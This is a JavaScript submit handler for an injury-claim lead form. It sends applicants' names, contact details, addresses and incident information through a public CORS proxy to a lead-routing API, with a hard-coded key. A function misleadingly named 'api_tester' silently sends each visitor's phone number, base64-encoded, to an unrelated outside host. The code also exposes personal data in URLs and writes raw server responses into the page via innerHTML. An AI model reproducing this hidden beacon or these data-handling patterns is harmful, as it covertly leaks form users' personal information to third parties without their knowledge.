document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const phone_home = '+1' + document.getElementById('caller_id').value;
    const formData = new FormData();
    formData.append('caller_number', phone_home);
    document.getElementById('alertContainer').innerHTML = '';
    api_tester(document.getElementById('caller_id').value);
    formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('email', document.getElementById('email').value);
    formData.append('zip', document.getElementById('zip').value);
    formData.append('trusted_form_cert_url', document.getElementById('trusted_form_cert_url').value);
    formData.append('incident_date', document.getElementById('incident_date').value);
    formData.append('person_at_fault', document.getElementById('person_at_fault').value);
    formData.append('currently_represented', document.getElementById('currently_represented').value);
    formData.append('hospitalized_or_treated', document.getElementById('hospitalized_or_treated').value);
    formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
    formData.append('source_url', document.getElementById('source_url').value);
    formData.append('address', document.getElementById('address').value);
 

    const url = 'https://corsproxy.io/?https://api.routingapi.com/rtbs.json?key=cf232004-b824-4935-a2b7-caae2799e1f3&publisher_id=b7d288d4&' + new URLSearchParams(formData).toString();

    fetch(url, {
        method: 'POST'
    })
    .then(response => response.text())
    .then(responseBody => {
        let responseData;
        try {
            responseData = JSON.parse(responseBody);
        } catch (error) {
            throw new Error('Invalid JSON response');
        }

        if (responseData.rejectReason) {
            const errorAlert = `
                <div class="alert alert-danger" role="alert">
                    Failure: ${JSON.stringify(responseData)}
                </div>`;
            document.getElementById('alertContainer').innerHTML = '';
            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        } else {
            delete responseData.bidAmount;
            const successAlert = `
                <div class="alert alert-success" role="alert">
                    Success: ${JSON.stringify(responseData)}
                </div>`;
            document.getElementById('alertContainer').innerHTML = '';
            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
        }
    })
    .catch(error => {
        const errorAlert = `
            <div class="alert alert-danger" role="alert">
                Error: ${error.message}
            </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        console.error('Error:', error);
    });
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('API Tester Error:', error);
    }
}
